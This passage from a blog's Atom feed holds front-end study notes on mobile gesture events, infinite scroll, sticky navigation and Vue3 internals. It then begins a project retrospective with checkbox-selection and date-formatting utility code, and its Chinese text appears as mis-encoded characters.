class="comment">// å‘ç”Ÿ pan æ»‘å±</span></span><br><span class="line">    <span class="keyword">if</span> (dx ** <span class="number">2</span> + dy ** <span class="number">2</span> &gt; <span class="number">100</span> &amp;&amp; !contexts.isPan) &#123;</span><br><span class="line">      contexts.isPan = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// å¦‚æœæ˜¯é•¿æŒ‰</span></span><br><span class="line">      <span class="keyword">if</span> (contexts.isPress) &#123;</span><br><span class="line">        ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;presscancel&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å‘ç”Ÿæ»‘å±åå°±ä¸æ˜¯é•¿æŒ‰</span></span><br><span class="line">      <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">      contexts.isPress = <span class="literal">false</span>;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panstart&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      <span class="comment">// é˜²æ­¢åŒæ—¶æ‰§è¡Œ</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pan&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e, contexts</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(contexts.timeout);</span><br><span class="line">    <span class="keyword">if</span> (contexts.isPan) &#123;</span><br><span class="line">      ele.dispatchEvent(</span><br><span class="line">        <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;panend&quot;</span>), &#123;</span><br><span class="line">          <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">          <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">          <span class="attr">startX</span>: contexts.startX,</span><br><span class="line">          <span class="attr">startY</span>: contexts.startY,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      contexts.isPan = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isTap) &#123;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;tap&quot;</span>));</span><br><span class="line">      contexts.isTap = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contexts.isPress) &#123;</span><br><span class="line">      ele.dispatchEvent(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;pressend&quot;</span>));</span><br><span class="line">      contexts.isPress = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="å››ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆè½®æ’­å›¾ï¼‰"><a href="#å››ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆè½®æ’­å›¾ï¼‰" class="headerlink" title="å››ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆè½®æ’­å›¾ï¼‰"></a>å››ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆè½®æ’­å›¾ï¼‰</h2><p>è§ <a href="https://github.com/Asura1211/YouthCamp/blob/lcj/day4/12-%E5%B9%BB%E7%81%AF%E7%89%87.html">github åœ°å€</a>ï¼ˆæ€è·¯çœŸçš„å¾ˆå¥½ï¼ï¼‰ è¿˜æœ‰<a href="https://learn.kaikeba.com/video/464299">å›æ”¾å½•å±</a>ã€‚</p><h2 id="äº”ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆå•†åŸé¦–é¡µï¼‰"><a href="#äº”ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆå•†åŸé¦–é¡µï¼‰" class="headerlink" title="äº”ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆå•†åŸé¦–é¡µï¼‰"></a>äº”ã€ç§»åŠ¨ç«¯å®æˆ˜ï¼ˆå•†åŸé¦–é¡µï¼‰</h2><h3 id="æ— é™åˆ—è¡¨"><a href="#æ— é™åˆ—è¡¨" class="headerlink" title="æ— é™åˆ—è¡¨"></a>æ— é™åˆ—è¡¨</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// å½“å‰æ»šè½®é«˜åº¦( chrome ä¸­ scrollTop éœ€åŒºåˆ«å¯¹å¾…)</span></span><br><span class="line">    <span class="keyword">let</span> scrollTop = <span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="comment">// å½“å‰å¯è§†åŒºåŸŸçš„é«˜åº¦</span></span><br><span class="line">    <span class="keyword">let</span> viewHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">    <span class="comment">// é¡µé¢æ€»é«˜åº¦</span></span><br><span class="line">    <span class="keyword">let</span> scrollHeight = <span class="built_in">document</span>.body.scrollHeight</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(scrollHeight-scrollTop&lt;=viewHeight)&#123;</span><br><span class="line">        <span class="comment">// åˆ°è¾¾åº•éƒ¨</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¸é¡¶"><a href="#å¸é¡¶" class="headerlink" title="å¸é¡¶"></a>å¸é¡¶</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> targetNav, offsetTop;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    targetNav = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.yellow&#x27;</span>);</span><br><span class="line">    offsetTop = targetNav.offsetTop</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// å½“å‰æ»šè½®é«˜åº¦</span></span><br><span class="line">    <span class="keyword">let</span> scrollTop = <span class="built_in">document</span>.body.scrollTop || <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="comment">// å½“å‰å¯è§†åŒºåŸŸçš„é«˜åº¦</span></span><br><span class="line">    <span class="keyword">let</span> viewHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">    <span class="comment">// é¡µé¢æ€»é«˜åº¦</span></span><br><span class="line">    <span class="keyword">let</span> scrollHeight = <span class="built_in">document</span>.body.scrollHeight</span><br><span class="line">    <span class="keyword">if</span> (scrollTop &gt; offsetTop) &#123;</span><br><span class="line">        targetNav.style.position = <span class="string">&quot;fixed&quot;</span>;</span><br><span class="line">        targetNav.style.top = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        targetNav.nextElementSibling.style.marginTop = targetNav.offsetHeight + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        targetNav.style.position = <span class="string">&quot;relative&quot;</span>;</span><br><span class="line">        targetNav.nextElementSibling.style.marginTop = <span class="string">&#x27;0px&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æµè§ˆè¿›åº¦"><a href="#æµè§ˆè¿›åº¦" class="headerlink" title="æµè§ˆè¿›åº¦"></a>æµè§ˆè¿›åº¦</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav blue &quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:80vw; height:1vw; position:absolute; left:50%; top: 50%; transform: translate(-50%,-50%);background-color: #fff;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;progressbar&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 10%;height: 100%;background-color: black;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&quot;#progressbar&quot;</span>).style.width = <span class="built_in">Math</span>.min(scrollTop / (scrollHeight - viewHeight * <span class="number">1.7</span>) * <span class="number">100</span>, <span class="number">100</span>) + <span class="string">&quot;%&quot;</span></span><br></pre></td></tr></table></figure><h1 id="9-24-Vue3"><a href="#9-24-Vue3" class="headerlink" title="9.24 Vue3"></a>9.24 Vue3</h1><h2 id="è®¾è®¡ç†å¿µ"><a href="#è®¾è®¡ç†å¿µ" class="headerlink" title="è®¾è®¡ç†å¿µ"></a>è®¾è®¡ç†å¿µ</h2><ul><li>æ˜“ä¸Šæ‰‹</li><li>æ•°æ®é©±åŠ¨ ï¼ˆå‡å°‘ dom æ“ä½œï¼‰ï¼šå£°æ˜å¼æ¸²æŸ“ï¼Œvdomï¼Œpatch</li><li>æ¸è¿›å¼ï¼ˆprogressiveï¼‰ï¼šminã€vuexã€routerâ€¦</li><li>è®¾è®¡åŠ¨æœº<ul><li>ç”¨å‡½æ•°çš„æ–¹å¼åˆ›å»ºï¼šç±»å‹æ”¯æŒï¼Œæ¶ˆç­ thisã€‚ï¼ˆå‡½æ•°ï¼švue3ã€reactï¼›classï¼švue2ã€Angularï¼‰</li><li>å®ä¾‹æ–¹æ³•å’Œå±æ€§ï¼ˆtree-shakingï¼‰ï¼šæ¶ˆç­ dead codeã€‚æ¯”å¦‚ <code>Vue.component(&#39;comp&#39;,&#123;&#125;)</code>ã€‚</li><li>å¤ç”¨æ€§ã€å¯è¯»æ€§ã€å¯ç»´æŠ¤æ€§ï¼šæ•°æ®å’Œæ§åˆ¶æ•°æ®çš„ä¸šåŠ¡å†™åœ¨ä¸€èµ·ï¼Œå¯ä»¥å°æˆä¸€ä¸ª hookã€‚</li><li>API ç®€åŒ–ï¼šä¸€è‡´æ€§ï¼›ç®€åŒ–ï¼Œåˆ é™¤ä¸€äº›ç›¸åŒåŠŸèƒ½çš„ APIï¼ˆæ¯”å¦‚ v-model ä¸ .syncï¼‰ï¼Œè¿˜æœ‰ renderã€‚</li><li>æ‰©å±•æ€§ï¼šè‡ªå®šä¹‰æ¸²æŸ“å™¨ï¼Œ <code>Vue.createRenderer()</code></li><li>æ€§èƒ½ä¼˜åŒ–ï¼šå“åº”å¼ï¼ŒåŸºäº Proxyã€‚<ul><li>vue2 <code>Object.defineProperty(obj,&#123;&#125;)</code> åŸºäºé€’å½’ï¼Œæ•ˆç‡é—®é¢˜</li><li>æ•°ç»„æ— æ³•ç”¨ definePropertyï¼Œåªèƒ½å•ç‹¬å®ç°</li><li>api å½±å“ï¼ŒåŠ¨æ€å±æ€§çš„æ–°å¢åˆ é™¤ Vue.delete/set</li><li>class map set ç­‰çš„æ”¯æŒé—®é¢˜</li><li><strong>ä½†æ˜¯ Proxy çš„å…¼å®¹æ€§å¾ˆå·®</strong>ï¼ˆIE11ä¹Ÿæ— æ³•æ”¯æŒï¼‰</li></ul></li></ul></li></ul><p>setup ä¼˜å…ˆçº§é«˜äº dataã€‚å½“ä¸¤è€…ä¸­æœ‰å±æ€§é‡å¤æ—¶ï¼Œæ˜¾ç¤º setup çš„ã€‚</p><h2 id="æºç å­¦ä¹ "><a href="#æºç å­¦ä¹ " class="headerlink" title="æºç å­¦ä¹ "></a>æºç å­¦ä¹ </h2><h3 id="mini-vue"><a href="#mini-vue" class="headerlink" title="mini-vue"></a>mini-vue</h3><h4 id="01-02-åˆå§‹åŒ–"><a href="#01-02-åˆå§‹åŒ–" class="headerlink" title="01 02-åˆå§‹åŒ–"></a>01 02-åˆå§‹åŒ–</h4><p>è§ <a href="https://github.com/Asura1211/YouthCamp/tree/main/day5/design%E3%80%82">https://github.com/Asura1211/YouthCamp/tree/main/day5/designã€‚</a></p><p>ï¼ˆåŸæ¥çœŸçš„æ²¡æœ‰æƒ³çš„é‚£ä¹ˆéš¾å‘€ï¼‰</p><h4 id="03-å“åº”å¼"><a href="#03-å“åº”å¼" class="headerlink" title="03-å“åº”å¼"></a>03-å“åº”å¼</h4><p>reactive æ—¶ä¸appè§£è€¦æµç¨‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/10/05/iXpdeCbsWRVvHUO.png" alt="image.png"></p><p>æ³¨æ„ç‚¹ï¼š</p><ul><li>ä½¿ç”¨ effectStackï¼ˆæ•°ç»„ï¼‰ä¿å­˜ effect å‡½æ•°ï¼Œæ˜¯å› ä¸ºå‰¯ä½œç”¨å‡½æ•° effect å¯èƒ½åµŒå¥—è°ƒç”¨</li><li>effect ä¸­çš„ cb å‡½æ•°åªè¦è®¿é—®åˆ°å“åº”å¼æ•°æ®ï¼Œå°±ä¸€å®šä¼šè§¦å‘ Proxy ä¸­çš„ get å‡½æ•°ï¼Œä»è€Œè§¦å‘ trackã€‚ç„¶åä¸ effectStack å»ºç«‹æ˜ å°„å…³ç³»</li><li>å½“ç”¨æˆ·ä¿®æ”¹å“åº”å¼æ•°æ®æ—¶ï¼Œè§¦å‘ set å‡½æ•°ï¼Œä»è€Œè§¦å‘ triggerã€‚</li></ul><h4 id="04-05-æ›´æ–°"><a href="#04-05-æ›´æ–°" class="headerlink" title="04 05-æ›´æ–°"></a>04 05-æ›´æ–°</h4><p>è™šæ‹Ÿ domï¼ˆvnodeï¼‰ï¼švnodeæ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li><p>js objectï¼Œä¸ºäº†æè¿°è§†å›¾</p></li><li><p>å‡å°‘ dom æ“ä½œ</p></li><li><p>é«˜æ•ˆæ›´æ–°</p></li></ul><p>diff patchï¼šé€šè¿‡æ¯”è¾ƒå·²å­˜åœ¨çš„ vnodeï¼Œæœ€å¤§é™åº¦çš„å¤ç”¨å·²å­˜åœ¨çš„ dom èŠ‚ç‚¹ï¼Œæœ€ç»ˆå¯ä»¥æœ€å°åŒ– dom æ“ä½œã€‚</p><p>æ€§èƒ½ï¼š</p><ul><li>åŒå±‚æ¯”è¾ƒï¼Œæ·±åº¦ä¼˜å…ˆï¼ˆæ—¶é—´å¤æ‚åº¦è¾ƒä½ï¼‰</li><li>ç¼–è¯‘é˜¶æ®µè¿›è¡Œä¼˜åŒ–ï¼ˆvue-loaderï¼‰</li></ul><h4 id="06-æ›´æ–°å­å…ƒç´ ï¼ˆå‰æ•°ç»„åæ•°ç»„ï¼‰"><a href="#06-æ›´æ–°å­å…ƒç´ ï¼ˆå‰æ•°ç»„åæ•°ç»„ï¼‰" class="headerlink" title="06-æ›´æ–°å­å…ƒç´ ï¼ˆå‰æ•°ç»„åæ•°ç»„ï¼‰"></a>06-æ›´æ–°å­å…ƒç´ ï¼ˆå‰æ•°ç»„åæ•°ç»„ï¼‰</h4><p>æ¯”è¾ƒæ–¹æ³•ï¼šé¦–é¦–å°¾å°¾æ¯”è¾ƒï¼ˆåŒç«¯æ¯”è¾ƒï¼‰ï¼Œæ–°æ•°ç»„æœ‰å‰©ä¸‹å°±æ‰¹é‡åˆ›å»ºï¼Œè€æ•°ç»„æœ‰å‰©ä¸‹å°±æ‰¹é‡åˆ é™¤</p><h2 id="SFCåŸç†"><a href="#SFCåŸç†" class="headerlink" title="SFCåŸç†"></a>SFCåŸç†</h2><p>å•æ–‡ä»¶ç»„ä»¶ .vue</p><p>åŸç†ï¼švue-loader è§£æ SFC ä¸º js å¯¹è±¡ï¼ˆç»„ä»¶é…ç½®å¯¹è±¡ï¼‰ï¼Œå¯¹ .vue æ–‡ä»¶ä¸­çš„ template -&gt; render å‡½æ•°</p><p>babel-loader è§£æ script ä»£ç ä»¥åŠ .js æ–‡ä»¶</p><p>css-loader è§£æ style ä»£ç ä¸º css ä»£ç ï¼Œvue-style-loader å°† css ä»£ç è¿½åŠ åˆ°å®¿ä¸»é¡µé¢ã€‚ï¼ˆä¸åŒçš„ lang éœ€è¦é…ä¸åŒçš„ loaderï¼‰</p><h2 id="JSXåŸç†"><a href="#JSXåŸç†" class="headerlink" title="JSXåŸç†"></a>JSXåŸç†</h2><ul><li>babel-loader</li><li>@vue/babel-plugin-vue</li></ul><h2 id="ç»„ä»¶åŒ–"><a href="#ç»„ä»¶åŒ–" class="headerlink" title="ç»„ä»¶åŒ–"></a>ç»„ä»¶åŒ–</h2><h3 id="é€šä¿¡"><a href="#é€šä¿¡" class="headerlink" title="é€šä¿¡"></a>é€šä¿¡</h3><h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><p>minxins</p><p>composition</p><p>slots</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML&quot;&gt;&lt;a href=&quot;#HTML&quot; class=&quot;headerlink&quot; title=&quot;HTML&quot;&gt;&lt;/a&gt;HTML&lt;/h1&gt;&lt;h1 id=&quot;CSS&quot;&gt;&lt;a href=&quot;#CSS&quot; class=&quot;headerlink&quot; title=&quot;CSS&quot;&gt;&lt;/a&gt;CS</summary>
      
    
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é’è®­è¥" scheme="http://example.com/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>ã€é¡¹ç›®å¤ç›˜ã€‘â€” â€” è´¤å¾—å®¶eç¤¾åŒºå­¦å ‚ç®¡ç†ç³»ç»Ÿ</title>
    <link href="http://example.com/2021/07/16/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%A6%E5%A0%82%E6%A8%A1%E5%9D%97/"/>
    <id>http://example.com/2021/07/16/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E8%B4%A4%E5%BE%97%E5%AE%B6%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%A6%E5%A0%82%E6%A8%A1%E5%9D%97/</id>
    <published>2021-07-16T19:55:25.000Z</published>
    <updated>2021-07-29T11:22:09.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘å¯¹å®éªŒå®¤æ ¡ä¼åˆä½œé¡¹ç›®â€”â€”â€œè´¤å¾—å®¶eç¤¾åŒºå­¦å ‚ç®¡ç†ç³»ç»Ÿâ€çš„å¤ç›˜æ€»ç»“ã€‚é¡¹ç›®æ¥æ‰‹æ—¶é—´å¤§æ¦‚åœ¨2020å¹´12æœˆåº•ï¼Œå¯’å‡æ‹–æ‹–æ‹‰æ‹‰äº†æŒºä¹…ï¼Œæœ€åäº2021å¹´3æœˆè§£å†³æ‰€æœ‰bugã€‚</p><h1 id="é¡¹ç›®ç®€ä»‹"><a href="#é¡¹ç›®ç®€ä»‹" class="headerlink" title="é¡¹ç›®ç®€ä»‹"></a>é¡¹ç›®ç®€ä»‹</h1><p>è¯¥ç³»ç»Ÿä¸»è¦æ˜¯ä¸ºæ™ºæ…§ç¤¾åŒºå±…æ°‘æä¾›å­¦å ‚æœåŠ¡ï¼Œåå°çš„ç®¡ç†å¹³å°æ˜¯ä¸ºç®¡ç†è€…ç®¡ç†å­¦å ‚ä¿¡æ¯æœåŠ¡ï¼Œå…±åˆ†ä¸ºè¯¾ç¨‹ã€æ•™å¸ˆã€è¯¾è¡¨å’Œå­¦å‘˜é£é‡‡å››ä¸ªæ¨¡å—ã€‚é¡¹ç›®åŸºäº Vue çš„å•é¡µåº”ç”¨å¼€å‘æ¨¡å¼è¿›è¡Œå¼€å‘ã€‚</p><h1 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h1><h2 id="ä¸€ã€å‡½æ•°å°è£…"><a href="#ä¸€ã€å‡½æ•°å°è£…" class="headerlink" title="ä¸€ã€å‡½æ•°å°è£…"></a>ä¸€ã€å‡½æ•°å°è£…</h2><ol><li>ç”±äºä¸‰ä¸ªæ¨¡å—éƒ½éœ€è¦å®ç°å•é€‰å…¨é€‰çš„åŠŸèƒ½ï¼Œå› æ­¤å°†å¤šé€‰æ¡†è¿™äº›åŠŸèƒ½å†™åœ¨ä¸€ä¸ªjsæ–‡ä»¶ï¼Œæ”¾å…¥utilsæ–‡ä»¶å¤¹ç»Ÿä¸€ç®¡ç†ã€‚</li><li>å„æ¨¡å—å‡ ä¹éƒ½éœ€è¦å¯¹åå°è¿”å›çš„æ—¶é—´æˆ³è¿›è¡Œå¤„ç†ï¼Œå› æ­¤æŠŠæ‰€æœ‰æœ‰å…³åŠŸèƒ½å†™åœ¨jsæ–‡ä»¶ã€‚</li></ol><h2 id="å®ç°æ–¹æ¡ˆ"><a href="#å®ç°æ–¹æ¡ˆ" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><ol><li><p>åœ¨src&gt;utilsä¸­åˆ›å»ºselectAllController.jsæ–‡ä»¶ï¼Œå®šä¹‰ä¸€ä¸ªSelectAllControllerç±»ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SelectAllController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">checkItemName, checkAllId</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.checkItemName = checkItemName; <span class="comment">//å•é€‰checkboxçš„nameå€¼</span></span><br><span class="line">        <span class="built_in">this</span>.checkAllId = checkAllId; <span class="comment">//å…¨é€‰checkboxçš„idå€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">checkItem</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">let</span> checkAllInput = <span class="built_in">document</span>.getElementById(self.checkAllId);</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(self.checkItemName);</span><br><span class="line">        <span class="keyword">let</span> checkedItemNum = <span class="number">0</span>;</span><br><span class="line">        checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (element.checked) &#123;</span><br><span class="line">                checkedItemNum++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span> (checkedItemNum == checkItems.length) &#123;</span><br><span class="line">            checkAllInput.checked = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            checkAllInput.checked = <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">checkAll</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">let</span> checkAllInput = <span class="built_in">document</span>.getElementById(self.checkAllId);</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(self.checkItemName);</span><br><span class="line">        <span class="keyword">if</span> (checkAllInput.checked == <span class="literal">true</span>) &#123;</span><br><span class="line">            checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">                element.checked = <span class="literal">true</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">                element.checked = <span class="literal">false</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–å·²é€‰ä¸­çš„åˆ—è¡¨</span></span><br><span class="line">    <span class="function"><span class="title">getcheckedItemIdList</span>(<span class="params">itemId</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> itemIdList = [];</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(<span class="built_in">this</span>.checkItemName);</span><br><span class="line">        checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (element.checked) &#123;</span><br><span class="line">                itemIdList.push(element.getAttribute(itemId));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> itemIdList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é»˜è®¤å¯¼å‡ºç±»</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> SelectAllController</span><br></pre></td></tr></table></figure><p>åœ¨vueæ–‡ä»¶ä¸­ï¼Œå…ˆimportæ¨¡å—ï¼Œå†newç”Ÿæˆå®ä¾‹ï¼Œå•åç„¶åä»…éœ€ä¸ºæ¯ä¸ªå•é€‰checkboxè®¾ç½®nameå€¼ï¼Œä¸ºå…¨é€‰checkboxè®¾ç½®idå€¼ï¼Œå†è°ƒç”¨ç±»çš„æ–¹æ³•å³å¯ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">checkItem</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.selectAllController.checkItem();</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">checkAll</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.selectAllController.checkAll();</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>åœ¨src&gt;utilsä¸­åˆ›å»ºdateFormatter.jsæ–‡ä»¶ï¼Œé»˜è®¤å¯¼å‡ºä¸€ä¸ªå‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">formatDate</span>(<span class="params">fmt, date</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (date === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Date</span>(date);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;</span><br><span class="line">        <span class="string">&quot;M+&quot;</span>: a.getMonth() + <span class="number">1</span>, <span class="comment">//æœˆä»½</span></span><br><span class="line">        <span class="string">&quot;d+&quot;</span>: a.getDate(), <span class="comment">//æ—¥</span></span><br><span class="line">        <span class="string">&quot;h+&quot;</span>: a.getHours(), <span class="comment">//å°æ—¶</span></span><br><span class="line">        <span class="string">&quot;m+&quot;</span>: a.getMinutes(), <span class="comment">//åˆ†</span></span><br><span class="line">        <span class="string">&quot;s+&quot;</span>: a.getSeconds(), <span class="comment">//ç§’</span></span><br><span class="line">        <span class="string">&quot;q+&quot;</span>: <span class="built_in">Math</span>.floor((a.getMonth() + <span class="number">3</span>) / <span class="number">3</span>), <span class="comment">//å­£åº¦</span></span><br><span class="line">        <span class="attr">S</span>: a.getMilliseconds() <span class="comment">//æ¯«ç§’</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span 